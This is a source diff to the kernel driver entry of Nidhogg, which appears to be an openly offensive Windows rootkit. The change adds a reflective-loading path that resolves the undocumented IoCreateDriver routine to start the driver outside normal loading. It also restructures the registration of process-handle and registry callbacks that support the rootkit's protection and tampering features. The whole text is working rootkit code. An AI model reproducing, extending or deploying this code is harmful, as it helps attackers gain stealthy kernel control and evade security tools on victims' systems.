@@ -2,7 +2,31 @@
 #include "NidhoggUtils.h"
 
 extern "C"
-NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
+NTSTATUS CustomDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
+#ifdef DRIVER_REFLECTIVELY_LOADED
+	UNREFERENCED_PARAMETER(DriverObject);
+	UNREFERENCED_PARAMETER(RegistryPath);
+	Features.DriverReflectivelyLoaded = true;
+	Features.ProcessProtection = false;
+	Features.RegistryFeatures = false;
+	KdPrint((DRIVER_PREFIX "Driver is being reflectively loaded...\n"));
+
+	UNICODE_STRING driverName = RTL_CONSTANT_STRING(L"\\Driver\\Nidhogg");
+	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"IoCreateDriver");
+	tIoCreateDriver IoCreateDriver = (tIoCreateDriver)MmGetSystemRoutineAddress(&routineName);
+
+	if (!IoCreateDriver)
+		return STATUS_INCOMPATIBLE_DRIVER_BLOCKED;
+
+	return IoCreateDriver(&driverName, &NidhoggEntry);
+#endif
+
+	return NidhoggEntry(DriverObject, RegistryPath);
+}
+
+NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
+	UNREFERENCED_PARAMETER(RegistryPath);
+
 	NTSTATUS status = STATUS_SUCCESS;
 	pGlobals.Init();
 	fGlobals.Init();
@@ -18,10 +42,8 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	if (!Features.WriteData || !dimGlobals.PsGetProcessPeb)
 		Features.FunctionPatching = false;
 
-	if (!dimGlobals.ObReferenceObjectByName) {
-		Features.FileHiding = false;
+	if (!dimGlobals.ObReferenceObjectByName)
 		Features.FileProtection = false;
-	}
 
 	// Setting up the device object.
 	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_DEVICE_NAME);
@@ -34,48 +56,50 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
 
 	if (!NT_SUCCESS(status)) {
-		KdPrint((DRIVER_PREFIX "failed to create device: (0x%08X)\n", status));
+		KdPrint((DRIVER_PREFIX "Failed to create device: (0x%08X)\n", status));
 		return status;
 	}
 
 	status = IoCreateSymbolicLink(&symbolicLink, &deviceName);
 
 	if (!NT_SUCCESS(status)) {
-		KdPrint((DRIVER_PREFIX "failed to create symbolic link: (0x%08X)\n", status));
+		KdPrint((DRIVER_PREFIX "Failed to create symbolic link: (0x%08X)\n", status));
 		IoDeleteDevice(DeviceObject);
 		return status;
 	}
 
-	// Registering the process and file hooking function.
-	OB_OPERATION_REGISTRATION operations[] = {
+	// Registering the process callback function only if the driver isn't reflectively loaded (to avoid BSOD).
+	if (!Features.DriverReflectivelyLoaded) {
+		OB_OPERATION_REGISTRATION operations[] = {
 		{
 			PsProcessType,		// object type
 			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
 			OnPreOpenProcess, nullptr	// pre, post
 		}
-	};
-	OB_CALLBACK_REGISTRATION registrationCallbacks = {
-		OB_FLT_REGISTRATION_VERSION,
-		1,				// operation count
-		RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE),		// altitude
-		nullptr,		// context
-		operations
-	};
+		};
+		OB_CALLBACK_REGISTRATION registrationCallbacks = {
+			OB_FLT_REGISTRATION_VERSION,
+			1,				// operation count
+			RTL_CONSTANT_STRING(OB_CALLBACKS_ALTITUDE),		// altitude
+			nullptr,		// context
+			operations
+		};
 
-	status = ObRegisterCallbacks(&registrationCallbacks, &RegistrationHandle);
+		status = ObRegisterCallbacks(&registrationCallbacks, &RegistrationHandle);
 
-	if (!NT_SUCCESS(status)) {
-		KdPrint((DRIVER_PREFIX "failed to register process and file callbacks: (0x%08X)\n", status));
-		status = STATUS_SUCCESS;
-		Features.ProcessProtection = false;
-	}
+		if (!NT_SUCCESS(status)) {
+			KdPrint((DRIVER_PREFIX "Failed to register process callback: (0x%08X)\n", status));
+			status = STATUS_SUCCESS;
+			Features.ProcessProtection = false;
+		}
 
-	status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &rGlobals.RegCookie, nullptr);
+		status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &rGlobals.RegCookie, nullptr);
 
-	if (!NT_SUCCESS(status)) {
-		KdPrint((DRIVER_PREFIX "failed to register registry callback: (0x%08X)\n", status));
-		status = STATUS_SUCCESS;
-		Features.RegistryFeatures = false;
+		if (!NT_SUCCESS(status)) {
+			KdPrint((DRIVER_PREFIX "Failed to register registry callback: (0x%08X)\n", status));
+			status = STATUS_SUCCESS;
+			Features.RegistryFeatures = false;
+		}
 	}
 
 	// Setting up functions.
